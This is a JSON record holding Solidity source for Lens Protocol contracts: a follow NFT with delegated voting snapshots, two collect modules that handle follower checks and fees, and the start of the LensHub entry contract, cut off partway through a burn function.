[
    {
        "Code": "// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {IFollowNFT} from '../interfaces/IFollowNFT.sol';\nimport {IFollowModule} from '../interfaces/IFollowModule.sol';\nimport {ILensHub} from '../interfaces/ILensHub.sol';\nimport {Errors} from '../libraries/Errors.sol';\nimport {Events} from '../libraries/Events.sol';\nimport {DataTypes} from '../libraries/DataTypes.sol';\nimport {LensNFTBase} from './base/LensNFTBase.sol';\nimport {IERC721Metadata} from '@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol';\n\n/**\n * @title FollowNFT\n * @author Lens Protocol\n *\n * @notice This contract is the NFT that is minted upon following a given profile. It is cloned upon first follow for a\n * given profile, and includes built-in governance power and delegation mechanisms.\n *\n * NOTE: This contract assumes total NFT supply for this follow NFT will never exceed 2^128 - 1\n */\ncontract FollowNFT is LensNFTBase, IFollowNFT {\n    struct Snapshot {\n        uint128 blockNumber;\n        uint128 value;\n    }\n\n    address public immutable HUB;\n\n    bytes32 internal constant DELEGATE_BY_SIG_TYPEHASH =\n        0xb8f190a57772800093f4e2b186099eb4f1df0ed7f5e2791e89a4a07678e0aeff;\n    // keccak256(\n    // 'DelegateBySig(address delegator,address delegatee,uint256 nonce,uint256 deadline)'\n    // );\n\n    mapping(address => mapping(uint256 => Snapshot)) internal _snapshots;\n    mapping(address => address) internal _delegates;\n    mapping(address => uint256) internal _snapshotCount;\n    mapping(uint256 => Snapshot) internal _delSupplySnapshots;\n    uint256 internal _delSupplySnapshotCount;\n    uint256 internal _profileId;\n    uint256 internal _tokenIdCounter;\n\n    bool private _initialized;\n\n    // We create the FollowNFT with the pre-computed HUB address before deploying the hub.\n    constructor(address hub) {\n        HUB = hub;\n    }\n\n    /// @inheritdoc IFollowNFT\n    function initialize(\n        uint256 profileId,\n        string calldata name,\n        string calldata symbol\n    ) external override {\n        if (_initialized) revert Errors.Initialized();\n        _initialized = true;\n        _profileId = profileId;\n        super._initialize(name, symbol);\n        emit Events.FollowNFTInitialized(profileId, block.timestamp);\n    }\n\n    /// @inheritdoc IFollowNFT\n    function mint(address to) external override {\n        if (msg.sender != HUB) revert Errors.NotHub();\n        uint256 tokenId = ++_tokenIdCounter;\n        _mint(to, tokenId);\n    }\n\n    /// @inheritdoc IFollowNFT\n    function delegate(address delegatee) external override {\n        _delegate(msg.sender, delegatee);\n    }\n\n    /// @inheritdoc IFollowNFT\n    function delegateBySig(\n        address delegator,\n        address delegatee,\n        DataTypes.EIP712Signature calldata sig\n    ) external override {\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            DELEGATE_BY_SIG_TYPEHASH,\n                            delegator,\n                            delegatee,\n                            sigNonces[delegator]++,\n                            sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n        _validateRecoveredAddress(digest, delegator, sig);\n        _delegate(delegator, delegatee);\n    }\n\n    /// @inheritdoc IFollowNFT\n    function getPowerByBlockNumber(address user, uint256 blockNumber)\n        external\n        view\n        override\n        returns (uint256)\n    {\n        if (blockNumber > block.number) revert Errors.BlockNumberInvalid();\n\n        uint256 snapshotCount = _snapshotCount[user];\n\n        if (snapshotCount == 0) {\n            return 0; // Returning zero since this means the user never delegated and has no power\n        }\n\n        uint256 lower = 0;\n        uint256 upper = snapshotCount - 1;\n\n        // First check most recent balance\n        if (_snapshots[user][upper].blockNumber <= blockNumber) {\n            return _snapshots[user][upper].value;\n        }\n\n        // Next check implicit zero balance\n        if (_snapshots[user][lower].blockNumber > blockNumber) {\n            return 0;\n        }\n\n        while (upper > lower) {\n            uint256 center = upper - (upper - lower) / 2;\n            Snapshot memory snapshot = _snapshots[user][center];\n            if (snapshot.blockNumber == blockNumber) {\n                return snapshot.value;\n            } else if (snapshot.blockNumber < blockNumber) {\n                lower = center;\n            } else {\n                upper = center - 1;\n            }\n        }\n        return _snapshots[user][lower].value;\n    }\n\n    /// @inheritdoc IFollowNFT\n    function getDelegatedSupplyByBlockNumber(uint256 blockNumber)\n        external\n        view\n        override\n        returns (uint256)\n    {\n        if (blockNumber > block.number) revert Errors.BlockNumberInvalid();\n\n        uint256 snapshotCount = _delSupplySnapshotCount;\n\n        if (snapshotCount == 0) {\n            return 0; // Returning zero since this means a delegation has never occurred\n        }\n\n        uint256 lower = 0;\n        uint256 upper = snapshotCount - 1;\n\n        // First check most recent delegated supply\n        if (_delSupplySnapshots[upper].blockNumber <= blockNumber) {\n            return _delSupplySnapshots[upper].value;\n        }\n\n        // Next check implicit zero balance\n        if (_delSupplySnapshots[lower].blockNumber > blockNumber) {\n            return 0;\n        }\n\n        while (upper > lower) {\n            uint256 center = upper - (upper - lower) / 2;\n            Snapshot memory snapshot = _delSupplySnapshots[center];\n            if (snapshot.blockNumber == blockNumber) {\n                return snapshot.value;\n            } else if (snapshot.blockNumber < blockNumber) {\n                lower = center;\n            } else {\n                upper = center - 1;\n            }\n        }\n        return _delSupplySnapshots[lower].value;\n    }\n\n    /**\n     * @dev This returns the follow NFT URI fetched from the hub.\n     */\n    function tokenURI(uint256 tokenId) public view override returns (string memory) {\n        if (!_exists(tokenId)) revert Errors.TokenDoesNotExist();\n        return ILensHub(HUB).getFollowNFTURI(_profileId);\n    }\n\n    /**\n     * @dev Upon transfers, we move the appropriate delegations, and emit the transfer event in the hub.\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal override {\n        address fromDelegatee = _delegates[from];\n        address toDelegatee =  _delegates[to];\n        address followModule = ILensHub(HUB).getFollowModule(_profileId);\n\n        _moveDelegate(fromDelegatee, toDelegatee, 1);\n\n        super._beforeTokenTransfer(from, to, tokenId);\n        ILensHub(HUB).emitFollowNFTTransferEvent(_profileId, tokenId, from, to);\n        if (followModule != address(0)) {\n            IFollowModule(followModule).followModuleTransferHook(_profileId, from, to, tokenId);\n        }\n    }\n\n    function _delegate(address delegator, address delegatee) internal {\n        uint256 delegatorBalance = balanceOf(delegator);\n        address previousDelegate = _delegates[delegator];\n        _delegates[delegator] = delegatee;\n        _moveDelegate(previousDelegate, delegatee, delegatorBalance);\n    }\n\n    function _moveDelegate(\n        address from,\n        address to,\n        uint256 amount\n    ) internal {\n        unchecked {\n            if (from != address(0)) {\n                uint256 fromSnapshotCount = _snapshotCount[from];\n\n                // Underflow is impossible since, if from != address(0), then a delegation must have occurred (at least 1 snapshot)\n                uint256 previous = _snapshots[from][fromSnapshotCount - 1].value;\n                uint128 newValue = uint128(previous - amount);\n\n                _writeSnapshot(from, newValue, fromSnapshotCount);\n                emit Events.FollowNFTDelegatedPowerChanged(from, newValue, block.timestamp);\n            }\n\n            if (to != address(0)) {\n                // if from == address(0) then this is an initial delegation (add amount to supply)\n                if (from == address(0)) {\n                    // It is expected behavior that the `previousDelSupply` underflows upon the first delegation,\n                    // returning the expected value of zero\n                    uint256 delSupplySnapshotCount = _delSupplySnapshotCount;\n                    uint128 previousDelSupply = _delSupplySnapshots[delSupplySnapshotCount - 1]\n                        .value;\n                    uint128 newDelSupply = uint128(previousDelSupply + amount);\n                    _writeSupplySnapshot(newDelSupply, delSupplySnapshotCount);\n                }\n\n                // It is expected behavior that `previous` underflows upon the first delegation to an address,\n                // returning the expected value of zero\n                uint256 toSnapshotCount = _snapshotCount[to];\n                uint128 previous = _snapshots[to][toSnapshotCount - 1].value;\n                uint128 newValue = uint128(previous + amount);\n                _writeSnapshot(to, newValue, toSnapshotCount);\n                emit Events.FollowNFTDelegatedPowerChanged(to, newValue, block.timestamp);\n            } else {\n                // If from != address(0) then this is removing a delegation, otherwise we're dealing with a\n                // non-delegated burn of tokens and don't need to take any action\n                if (from != address(0)) {\n                    // Upon removing delegation (from != address(0) && to == address(0)), supply calculations cannot\n                    // underflow because if from != address(0), then a delegation must have previously occurred, so\n                    // the snapshot count must be >= 1 and the previous delegated supply must be >= amount\n                    uint256 delSupplySnapshotCount = _delSupplySnapshotCount;\n                    uint128 previousDelSupply = _delSupplySnapshots[delSupplySnapshotCount - 1]\n                        .value;\n                    uint128 newDelSupply = uint128(previousDelSupply - amount);\n                    _writeSupplySnapshot(newDelSupply, delSupplySnapshotCount);\n                }\n            }\n        }\n    }\n\n    function _writeSnapshot(\n        address owner,\n        uint128 newValue,\n        uint256 ownerSnapshotCount\n    ) internal {\n        unchecked {\n            uint128 currentBlock = uint128(block.number);\n            mapping(uint256 => Snapshot) storage ownerSnapshots = _snapshots[owner];\n\n            // Doing multiple operations in the same block\n            if (\n                ownerSnapshotCount != 0 &&\n                ownerSnapshots[ownerSnapshotCount - 1].blockNumber == currentBlock\n            ) {\n                ownerSnapshots[ownerSnapshotCount - 1].value = newValue;\n            } else {\n                ownerSnapshots[ownerSnapshotCount] = Snapshot(currentBlock, newValue);\n                _snapshotCount[owner] = ownerSnapshotCount + 1;\n            }\n        }\n    }\n\n    function _writeSupplySnapshot(uint128 newValue, uint256 supplySnapshotCount) internal {\n        unchecked {\n            uint128 currentBlock = uint128(block.number);\n\n            // Doing multiple operations in the same block\n            if (\n                supplySnapshotCount != 0 &&\n                _delSupplySnapshots[supplySnapshotCount - 1].blockNumber == currentBlock\n            ) {\n                _delSupplySnapshots[supplySnapshotCount - 1].value = newValue;\n            } else {\n                _delSupplySnapshots[supplySnapshotCount] = Snapshot(currentBlock, newValue);\n                _delSupplySnapshotCount = supplySnapshotCount + 1;\n            }\n        }\n    }\n}\n\n\n// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {ICollectModule} from '../../../interfaces/ICollectModule.sol';\nimport {ModuleBase} from '../ModuleBase.sol';\nimport {FollowValidationModuleBase} from '../FollowValidationModuleBase.sol';\n\n/**\n * @title EmptyCollectModule\n * @author Lens Protocol\n *\n * @notice This is a simple Lens CollectModule implementation, inheriting from the ICollectModule interface.\n *\n * This module works by allowing all collects by followers.\n */\ncontract EmptyCollectModule is ICollectModule, FollowValidationModuleBase {\n    constructor(address hub) ModuleBase(hub) {}\n\n    /**\n     * @dev There is nothing needed at initialization.\n     */\n    function initializePublicationCollectModule(\n        uint256 profileId,\n        uint256 pubId,\n        bytes calldata data\n    ) external pure override returns (bytes memory) {\n        return new bytes(0);\n    }\n\n    /**\n     * @dev Processes a collect by:\n     *  1. Ensuring the collector is a follower\n     */\n    function processCollect(\n        uint256 referrerProfileId,\n        address collector,\n        uint256 profileId,\n        uint256 pubId,\n        bytes calldata data\n    ) external view override {\n        _checkFollowValidity(profileId, collector);\n    }\n}\n\n\n// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {ICollectModule} from '../../../interfaces/ICollectModule.sol';\nimport {Errors} from '../../../libraries/Errors.sol';\nimport {FeeModuleBase} from '../FeeModuleBase.sol';\nimport {ModuleBase} from '../ModuleBase.sol';\nimport {FollowValidationModuleBase} from '../FollowValidationModuleBase.sol';\nimport {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';\nimport {SafeERC20} from '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';\nimport {IERC721} from '@openzeppelin/contracts/token/ERC721/IERC721.sol';\n\n/**\n * @notice A struct containing the necessary data to execute collect actions on a publication.\n *\n * @param amount The collecting cost associated with this publication.\n * @param recipient The recipient address associated with this publication.\n * @param currency The currency associated with this publication.\n * @param referralFee The referral fee associated with this publication.\n */\nstruct ProfilePublicationData {\n    uint256 amount;\n    address recipient;\n    address currency;\n    uint16 referralFee;\n}\n\n/**\n * @title FeeCollectModule\n * @author Lens Protocol\n *\n * @notice This is a simple Lens CollectModule implementation, inheriting from the ICollectModule interface and\n * the FeeCollectModuleBase abstract contract.\n *\n * This module works by allowing unlimited collects for a publication at a given price.\n */\ncontract FeeCollectModule is ICollectModule, FeeModuleBase, FollowValidationModuleBase {\n    using SafeERC20 for IERC20;\n\n    mapping(uint256 => mapping(uint256 => ProfilePublicationData))\n        internal _dataByPublicationByProfile;\n\n    constructor(address hub, address moduleGlobals) FeeModuleBase(moduleGlobals) ModuleBase(hub) {}\n\n    /**\n     * @notice This collect module levies a fee on collects and supports referrals. Thus, we need to decode data.\n     *\n     * @param profileId The token ID of the profile of the publisher, passed by the hub.\n     * @param pubId The publication ID of the newly created publication, passed by the hub.\n     * @param data The arbitrary data parameter, decoded into:\n     *      uint256 amount: The currency total amount to levy.\n     *      address currency: The currency address, must be internally whitelisted.\n     *      address recipient: The custom recipient address to direct earnings to.\n     *      uint16 referralFee: The referral fee to set.\n     *\n     * @return An abi encoded bytes parameter, which is the same as the passed data parameter.\n     */\n    function initializePublicationCollectModule(\n        uint256 profileId,\n        uint256 pubId,\n        bytes calldata data\n    ) external override onlyHub returns (bytes memory) {\n        (uint256 amount, address currency, address recipient, uint16 referralFee) = abi.decode(\n            data,\n            (uint256, address, address, uint16)\n        );\n        if (\n            !_currencyWhitelisted(currency) ||\n            recipient == address(0) ||\n            referralFee > BPS_MAX ||\n            amount < BPS_MAX\n        ) revert Errors.InitParamsInvalid();\n\n        _dataByPublicationByProfile[profileId][pubId].referralFee = referralFee;\n        _dataByPublicationByProfile[profileId][pubId].recipient = recipient;\n        _dataByPublicationByProfile[profileId][pubId].currency = currency;\n        _dataByPublicationByProfile[profileId][pubId].amount = amount;\n\n        return data;\n    }\n\n    /**\n     * @dev Processes a collect by:\n     *  1. Ensuring the collector is a follower\n     *  2. Charging a fee\n     */\n    function processCollect(\n        uint256 referrerProfileId,\n        address collector,\n        uint256 profileId,\n        uint256 pubId,\n        bytes calldata data\n    ) external virtual override onlyHub {\n        _checkFollowValidity(profileId, collector);\n        if (referrerProfileId == profileId) {\n            _processCollect(collector, profileId, pubId, data);\n        } else {\n            _processCollectWithReferral(referrerProfileId, collector, profileId, pubId, data);\n        }\n    }\n\n    /**\n     * @notice Returns the publication data for a given publication, or an empty struct if that publication was not\n     * initialized with this module.\n     *\n     * @param profileId The token ID of the profile mapped to the publication to query.\n     * @param pubId The publication ID of the publication to query.\n     *\n     * @return The ProfilePublicationData struct mapped to that publication.\n     */\n    function getPublicationData(uint256 profileId, uint256 pubId)\n        external\n        view\n        returns (ProfilePublicationData memory)\n    {\n        return _dataByPublicationByProfile[profileId][pubId];\n    }\n\n    function _processCollect(\n        address collector,\n        uint256 profileId,\n        uint256 pubId,\n        bytes calldata data\n    ) internal {\n        uint256 amount = _dataByPublicationByProfile[profileId][pubId].amount;\n        address currency = _dataByPublicationByProfile[profileId][pubId].currency;\n        _validateDataIsExpected(data, currency, amount);\n\n        (address treasury, uint16 treasuryFee) = _treasuryData();\n        address recipient = _dataByPublicationByProfile[profileId][pubId].recipient;\n        uint256 treasuryAmount = (amount * treasuryFee) / BPS_MAX;\n        uint256 adjustedAmount = amount - treasuryAmount;\n\n        IERC20(currency).safeTransferFrom(collector, recipient, adjustedAmount);\n        IERC20(currency).safeTransferFrom(collector, treasury, treasuryAmount);\n    }\n\n    function _processCollectWithReferral(\n        uint256 referrerProfileId,\n        address collector,\n        uint256 profileId,\n        uint256 pubId,\n        bytes calldata data\n    ) internal {\n        uint256 amount = _dataByPublicationByProfile[profileId][pubId].amount;\n        address currency = _dataByPublicationByProfile[profileId][pubId].currency;\n        _validateDataIsExpected(data, currency, amount);\n\n        uint256 referralFee = _dataByPublicationByProfile[profileId][pubId].referralFee;\n        address treasury;\n        uint256 treasuryAmount;\n\n        // Avoids stack too deep\n        {\n            uint16 treasuryFee;\n            (treasury, treasuryFee) = _treasuryData();\n            treasuryAmount = (amount * treasuryFee) / BPS_MAX;\n        }\n\n        uint256 adjustedAmount = amount - treasuryAmount;\n\n        if (referralFee != 0) {\n            // The reason we levy the referral fee on the adjusted amount is so that referral fees\n            // don't bypass the treasury fee, in essence referrals pay their fair share to the treasury.\n            uint256 referralAmount = (adjustedAmount * referralFee) / BPS_MAX;\n            adjustedAmount = adjustedAmount - referralAmount;\n\n            address referralRecipient = IERC721(HUB).ownerOf(referrerProfileId);\n\n            IERC20(currency).safeTransferFrom(collector, referralRecipient, referralAmount);\n        }\n        address recipient = _dataByPublicationByProfile[profileId][pubId].recipient;\n\n        IERC20(currency).safeTransferFrom(collector, recipient, adjustedAmount);\n        IERC20(currency).safeTransferFrom(collector, treasury, treasuryAmount);\n    }\n}\n\n\n// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {ILensHub} from '../interfaces/ILensHub.sol';\nimport {Events} from '../libraries/Events.sol';\nimport {Helpers} from '../libraries/Helpers.sol';\nimport {DataTypes} from '../libraries/DataTypes.sol';\nimport {Errors} from '../libraries/Errors.sol';\nimport {PublishingLogic} from '../libraries/PublishingLogic.sol';\nimport {InteractionLogic} from '../libraries/InteractionLogic.sol';\nimport {LensNFTBase} from './base/LensNFTBase.sol';\nimport {LensMultiState} from './base/LensMultiState.sol';\nimport {LensHubStorage} from './storage/LensHubStorage.sol';\nimport {VersionedInitializable} from '../upgradeability/VersionedInitializable.sol';\n\n/**\n * @title LensHub\n * @author Lens Protocol\n *\n * @notice This is the main entrypoint of the Lens Protocol. It contains governance functionality as well as\n * publishing and profile interaction functionality.\n *\n * NOTE: The Lens Protocol is unique in that frontend operators need to track a potentially overwhelming\n * number of NFT contracts and interactions at once. For that reason, we've made two quirky design decisions:\n *      1. Both Follow & Collect NFTs invoke an LensHub callback on transfer with the sole purpose of emitting an event.\n *      2. Almost every event in the protocol emits the current block timestamp, reducing the need to fetch it manually.\n */\ncontract LensHub is ILensHub, LensNFTBase, VersionedInitializable, LensMultiState, LensHubStorage {\n    uint256 internal constant REVISION = 1;\n\n    address internal immutable FOLLOW_NFT_IMPL;\n    address internal immutable COLLECT_NFT_IMPL;\n\n    /**\n     * @dev This modifier reverts if the caller is not the configured governance address.\n     */\n    modifier onlyGov() {\n        _validateCallerIsGovernance();\n        _;\n    }\n\n    /**\n     * @dev This modifier reverts if the caller is not a whitelisted profile creator address.\n     */\n    modifier onlyWhitelistedProfileCreator() {\n        _validateCallerIsWhitelistedProfileCreator();\n        _;\n    }\n\n    /**\n     * @dev The constructor sets the immutable follow & collect NFT implementations.\n     *\n     * @param followNFTImpl The follow NFT implementation address.\n     * @param collectNFTImpl The collect NFT implementation address.\n     */\n    constructor(address followNFTImpl, address collectNFTImpl) {\n        FOLLOW_NFT_IMPL = followNFTImpl;\n        COLLECT_NFT_IMPL = collectNFTImpl;\n    }\n\n    /// @inheritdoc ILensHub\n    function initialize(\n        string calldata name,\n        string calldata symbol,\n        address newGovernance\n    ) external override initializer {\n        super._initialize(name, symbol);\n        _setState(DataTypes.ProtocolState.Paused);\n        _setGovernance(newGovernance);\n    }\n\n    /// ***********************\n    /// *****GOV FUNCTIONS*****\n    /// ***********************\n\n    /// @inheritdoc ILensHub\n    function setGovernance(address newGovernance) external override onlyGov {\n        _setGovernance(newGovernance);\n    }\n\n    /// @inheritdoc ILensHub\n    function setEmergencyAdmin(address newEmergencyAdmin) external override onlyGov {\n        address prevEmergencyAdmin = _emergencyAdmin;\n        _emergencyAdmin = newEmergencyAdmin;\n        emit Events.EmergencyAdminSet(\n            msg.sender,\n            prevEmergencyAdmin,\n            newEmergencyAdmin,\n            block.timestamp\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setState(DataTypes.ProtocolState newState) external override {\n        if (msg.sender != _governance && msg.sender != _emergencyAdmin)\n            revert Errors.NotGovernanceOrEmergencyAdmin();\n        _setState(newState);\n    }\n\n    ///@inheritdoc ILensHub\n    function whitelistProfileCreator(address profileCreator, bool whitelist)\n        external\n        override\n        onlyGov\n    {\n        _profileCreatorWhitelisted[profileCreator] = whitelist;\n        emit Events.ProfileCreatorWhitelisted(profileCreator, whitelist, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function whitelistFollowModule(address followModule, bool whitelist) external override onlyGov {\n        _followModuleWhitelisted[followModule] = whitelist;\n        emit Events.FollowModuleWhitelisted(followModule, whitelist, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function whitelistReferenceModule(address referenceModule, bool whitelist)\n        external\n        override\n        onlyGov\n    {\n        _referenceModuleWhitelisted[referenceModule] = whitelist;\n        emit Events.ReferenceModuleWhitelisted(referenceModule, whitelist, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function whitelistCollectModule(address collectModule, bool whitelist)\n        external\n        override\n        onlyGov\n    {\n        _collectModuleWhitelisted[collectModule] = whitelist;\n        emit Events.CollectModuleWhitelisted(collectModule, whitelist, block.timestamp);\n    }\n\n    /// *********************************\n    /// *****PROFILE OWNER FUNCTIONS*****\n    /// *********************************\n\n    /// @inheritdoc ILensHub\n    function createProfile(DataTypes.CreateProfileData calldata vars)\n        external\n        override\n        whenNotPaused\n        onlyWhitelistedProfileCreator\n    {\n        uint256 profileId = ++_profileCounter;\n        _mint(vars.to, profileId);\n        PublishingLogic.createProfile(\n            vars,\n            profileId,\n            _profileIdByHandleHash,\n            _profileById,\n            _followModuleWhitelisted\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowModule(\n        uint256 profileId,\n        address followModule,\n        bytes calldata followModuleData\n    ) external override whenNotPaused {\n        _validateCallerIsProfileOwner(profileId);\n        PublishingLogic.setFollowModule(\n            profileId,\n            followModule,\n            followModuleData,\n            _profileById[profileId],\n            _followModuleWhitelisted\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowModuleWithSig(DataTypes.SetFollowModuleWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_FOLLOW_MODULE_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.followModule,\n                            keccak256(vars.followModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        PublishingLogic.setFollowModule(\n            vars.profileId,\n            vars.followModule,\n            vars.followModuleData,\n            _profileById[vars.profileId],\n            _followModuleWhitelisted\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setDispatcher(uint256 profileId, address dispatcher) external override whenNotPaused {\n        _validateCallerIsProfileOwner(profileId);\n        _setDispatcher(profileId, dispatcher);\n    }\n\n    /// @inheritdoc ILensHub\n    function setDispatcherWithSig(DataTypes.SetDispatcherWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_DISPATCHER_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.dispatcher,\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _setDispatcher(vars.profileId, vars.dispatcher);\n    }\n\n    /// @inheritdoc ILensHub\n    function setProfileImageURI(uint256 profileId, string calldata imageURI)\n        external\n        override\n        whenNotPaused\n    {\n        _validateCallerIsProfileOwnerOrDispatcher(profileId);\n        _setProfileImageURI(profileId, imageURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function setProfileImageURIWithSig(DataTypes.SetProfileImageURIWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_PROFILE_IMAGE_URI_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.imageURI)),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _setProfileImageURI(vars.profileId, vars.imageURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowNFTURI(uint256 profileId, string calldata followNFTURI)\n        external\n        override\n        whenNotPaused\n    {\n        _validateCallerIsProfileOwnerOrDispatcher(profileId);\n        _setFollowNFTURI(profileId, followNFTURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowNFTURIWithSig(DataTypes.SetFollowNFTURIWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_FOLLOW_NFT_URI_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.followNFTURI)),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _setFollowNFTURI(vars.profileId, vars.followNFTURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function post(DataTypes.PostData calldata vars) external override whenPublishingEnabled {\n        _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);\n        _createPost(\n            vars.profileId,\n            vars.contentURI,\n            vars.collectModule,\n            vars.collectModuleData,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function postWithSig(DataTypes.PostWithSigData calldata vars)\n        external\n        override\n        whenPublishingEnabled\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            POST_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.contentURI)),\n                            vars.collectModule,\n                            keccak256(vars.collectModuleData),\n                            vars.referenceModule,\n                            keccak256(vars.referenceModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _createPost(\n            vars.profileId,\n            vars.contentURI,\n            vars.collectModule,\n            vars.collectModuleData,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function comment(DataTypes.CommentData calldata vars) external override whenPublishingEnabled {\n        _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);\n        _createComment(vars);\n    }\n\n    /// @inheritdoc ILensHub\n    function commentWithSig(DataTypes.CommentWithSigData calldata vars)\n        external\n        override\n        whenPublishingEnabled\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            COMMENT_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.contentURI)),\n                            vars.profileIdPointed,\n                            vars.pubIdPointed,\n                            vars.collectModule,\n                            keccak256(vars.collectModuleData),\n                            vars.referenceModule,\n                            keccak256(vars.referenceModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _createComment(\n            DataTypes.CommentData(\n                vars.profileId,\n                vars.contentURI,\n                vars.profileIdPointed,\n                vars.pubIdPointed,\n                vars.collectModule,\n                vars.collectModuleData,\n                vars.referenceModule,\n                vars.referenceModuleData\n            )\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function mirror(DataTypes.MirrorData calldata vars) external override whenPublishingEnabled {\n        _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);\n        _createMirror(\n            vars.profileId,\n            vars.profileIdPointed,\n            vars.pubIdPointed,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function mirrorWithSig(DataTypes.MirrorWithSigData calldata vars)\n        external\n        override\n        whenPublishingEnabled\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            MIRROR_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.profileIdPointed,\n                            vars.pubIdPointed,\n                            vars.referenceModule,\n                            keccak256(vars.referenceModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _createMirror(\n            vars.profileId,\n            vars.profileIdPointed,\n            vars.pubIdPointed,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /**\n     * @notice Burns a profile, this maintains the profile data struct, but deletes the\n     * handle hash to profile ID mapping value.\n     *\n     * NOTE: This overrides the LensNFTBase contract's `burn()` function and calls it to fully burn\n     * the NFT.\n     */\n    function burn(uint256 tokenId) public override whenNotPaused {\n        super.burn(tokenId);\n        _clearHandleHash(tokenId);\n    }\n\n    /**\n     * @notice Burns a profile with a signature, this maintains the profile data struct, but deletes the\n     * handle hash to profile ID mapping value.\n     *\n     * NOTE: This overrides the LensNFTBase contract's `burnWithSig()` function and calls it to fully burn\n     * the NFT.\n     */\n    function burnWithSig(uint256 tokenId, DataTypes.EIP712Signature calldata sig)\n        public\n        override\n        whenNotPaused\n    {\n        super.burnWithSig(tokenId, sig);\n        